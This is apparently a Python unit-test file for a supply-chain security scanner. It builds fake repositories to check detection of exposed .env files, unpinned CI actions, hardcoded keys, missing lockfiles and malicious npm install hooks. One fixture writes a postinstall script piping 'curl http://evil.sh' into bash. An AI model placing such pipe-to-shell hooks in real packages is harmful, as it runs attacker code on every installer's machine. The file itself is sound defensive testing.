"""Supply-chain scanner tests: synthetic repo fixture on disk."""

import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from omnisectester import scm_scan  # noqa: E402


class TestScmScan(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = self._tmp.name

    def tearDown(self):
        self._tmp.cleanup()

    def _write(self, rel, content):
        path = Path(self.root) / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
        return str(path)

    def test_env_without_gitignore_is_critical(self):
        self._write(".env", "SECRET=x")
        result = scm_scan.run_scm_scan(self.root)
        s1 = [f for f in result["findings"] if f["id"] == "S001"]
        self.assertEqual(len(s1), 1)
        self.assertEqual(s1[0]["severity"], "critical")

    def test_env_with_gitignore_not_flagged(self):
        self._write(".env", "SECRET=x")
        self._write(".gitignore", ".env\n")
        result = scm_scan.run_scm_scan(self.root)
        self.assertFalse([f for f in result["findings"] if f["id"] == "S001"])

    def test_unpinned_action_flagged(self):
        self._write(".github/workflows/ci.yml",
                    "- uses: actions/checkout@main\n")
        result = scm_scan.run_scm_scan(self.root)
        s3 = [f for f in result["findings"] if f["id"] == "S003"]
        self.assertEqual(len(s3), 1)
        self.assertIn("@main", s3[0]["evidence"])

    def test_hardcoded_secret_flagged(self):
        self._write(".github/workflows/deploy.yml",
                    "deploy:\n  api_key: 'AKIA1234567890abcd'\n")
        result = scm_scan.run_scm_scan(self.root)
        self.assertTrue([f for f in result["findings"] if f["id"] == "S002"])

    def test_npm_pipe_to_shell_flagged(self):
        self._write("package.json", json.dumps({
            "scripts": {"postinstall": "curl http://evil.sh | bash"}}))
        result = scm_scan.run_scm_scan(self.root)
        s4 = [f for f in result["findings"] if f["id"] == "S004"]
        self.assertEqual(len(s4), 1)
        self.assertIn("postinstall", s4[0]["evidence"])

    def test_missing_lockfile_flagged(self):
        self._write("package.json", '{"dependencies": {"a": "^1"}}')
        result = scm_scan.run_scm_scan(self.root)
        self.assertTrue([f for f in result["findings"] if f["id"] == "S006"])

    def test_clean_repo_zero_findings(self):
        self._write("requirements.txt", "flask==3.0.0\n")
        self._write(".gitignore", ".env\n")
        result = scm_scan.run_scm_scan(self.root)
        self.assertEqual(result["stats"]["total"], 0)

    def test_sorted_deterministic_output(self):
        self._write(".env", "x=1")
        self._write("package.json", '{"scripts": {"p": "curl x|sh"}}')
        result = scm_scan.run_scm_scan(self.root)
        order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sevs = [order[f["severity"]] for f in result["findings"]]
        self.assertEqual(sevs, sorted(sevs))


if __name__ == "__main__":
    unittest.main(verbosity=2)
